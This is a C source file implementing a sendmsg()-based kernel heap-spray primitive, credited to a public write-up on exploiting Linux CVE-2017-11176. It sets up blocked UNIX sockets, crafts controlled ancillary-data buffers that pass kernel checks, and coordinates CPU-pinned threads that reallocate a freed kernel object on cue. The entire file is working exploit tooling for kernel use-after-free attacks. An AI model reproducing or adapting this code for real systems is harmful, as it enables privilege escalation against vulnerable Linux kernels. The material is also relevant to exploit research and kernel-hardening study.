#include <err.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <string.h>
#include <sys/syscall.h>

#include "sendmsg_spray.h"
#include "cpu_utils.h"

//Taken from: https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html

int init_realloc_data(char* realloc_data, size_t obj_size, int level, int type) {
  if (level == 1) err(1, "Level cannot be 1\n");
  struct cmsghdr *first;
  
  // necessary to pass checks in __scm_send()
  first = (struct cmsghdr*) realloc_data;
  first->cmsg_len = obj_size;
  first->cmsg_level = level;
  first->cmsg_type = type;
  return 0;  
}

int init_unix_sockets(struct realloc_thread_arg * rta) {
  struct timeval tv;
  static int sock_counter = 0;

  if (((rta->recv_fd = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) ||
      ((rta->send_fd = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0))
  {
    perror("[-] socket");
    goto fail;
  }

  memset(&rta->addr, 0, sizeof(rta->addr));
  rta->addr.sun_family = AF_UNIX;
  sprintf(rta->addr.sun_path + 1, "sock_%x_%d", gettid(), ++sock_counter);
  if (bind(rta->recv_fd, (struct sockaddr*)&rta->addr, sizeof(rta->addr)))
  {
    perror("[-] bind");
    goto fail;
  }

  if (connect(rta->send_fd, (struct sockaddr*)&rta->addr, sizeof(rta->addr)))
  {
    perror("[-] connect");
    goto fail;
  }

  memset(&tv, 0, sizeof(tv));
  if (setsockopt(rta->recv_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv))) {
    err(1, "setsockopt");
  }

  return 0;
fail:
  printf("[-] failed to initialize UNIX sockets!\n");
  return -1;
}

static volatile size_t g_nb_realloc_thread_ready = 0;
static volatile size_t g_realloc_now[MAX_SENDMSG_BATCH] = {0};

static void* realloc_thread(void *arg)
{
  struct realloc_thread_arg *rta = (struct realloc_thread_arg*) arg;
  struct msghdr mhdr;
  char buf[200] = {0};

  // initialize msghdr
  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf),
  };
  memset(&mhdr, 0, sizeof(mhdr));
  mhdr.msg_iov = &iov;
  mhdr.msg_iovlen = 1;

  // the thread should inherit main thread cpumask, better be sure and redo-it!
  migrate_to_cpu(rta->spray_cpu);

  // make it block
  while (sendmsg(rta->send_fd, &mhdr, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN)
  { 
    perror("[-] sendmsg");
    goto fail;
  }

  // use the ancillary data now
  iov.iov_len = 16;
  mhdr.msg_control = (void*)(rta->realloc_data); // use the ancillary data buffer
  mhdr.msg_controllen = rta->object_size;

  g_nb_realloc_thread_ready++;
  int batch_num = rta->batch_num;

  while (!g_realloc_now[batch_num]) // spinlock until the big GO!
    ;
  // the next call should block while "reallocating"
  if (sendmsg(rta->send_fd, &mhdr, 0) < 0)
  {
//    perror("[-] sendmsg");
    goto fail;
  }
  return NULL;

fail:
//  printf("[-] REALLOC THREAD FAILURE!!!\n");
  return NULL;
}

int init_reallocation(struct realloc_thread_arg *rta, size_t nb_reallocs)
{
  int thread = 0;
  int ret = -1;

  if (init_realloc_data(rta->realloc_data, rta->object_size, rta->level, rta->type))
  {
    printf("[-] failed to initialize reallocation data!\n");
    goto fail;
  }
  printf("[+] reallocation data initialized!\n");

  printf("[ ] initializing reallocation threads, please wait...\n");
  for (thread = 0; thread < nb_reallocs; ++thread)
  {
    if (init_unix_sockets(&rta[thread]))
    {
      printf("[-] failed to init UNIX sockets!\n");
      goto fail;
    }

    if ((ret = pthread_create(&rta[thread].tid, NULL, realloc_thread, &rta[thread])) != 0)
    {
      perror("[-] pthread_create");
      goto fail;
    }
  }

  while (g_nb_realloc_thread_ready < nb_reallocs)
    sched_yield();

  printf("[+] %lu reallocation threads ready!\n", nb_reallocs);

  return 0;

fail:
  printf("[-] failed to initialize reallocation\n");
  return -1;
}

void cleanup(struct realloc_thread_arg* rta) {
  struct msghdr mhdr;
  int size = 0;
  while (size >= 0) {
	if ((size = recvmsg(rta->recv_fd, &mhdr, MSG_DONTWAIT)) < 0) {
      break;
	}
  }
  close(rta->recv_fd);
  close(rta->send_fd);
}

void reset() {
  for (int i = 0; i < sizeof(g_realloc_now)/sizeof(size_t); i++) {
    g_realloc_now[i] = 0;
  }
  g_nb_realloc_thread_ready = 0;
}

void realloc_NOW(int interval)
{
  for (int i = 0; i < sizeof(g_realloc_now)/sizeof(size_t); i++) {
    g_realloc_now[i] = 1;
    usleep(interval);
  }
  sched_yield(); // don't run me, run the reallocator threads!
  sleep(5);
}

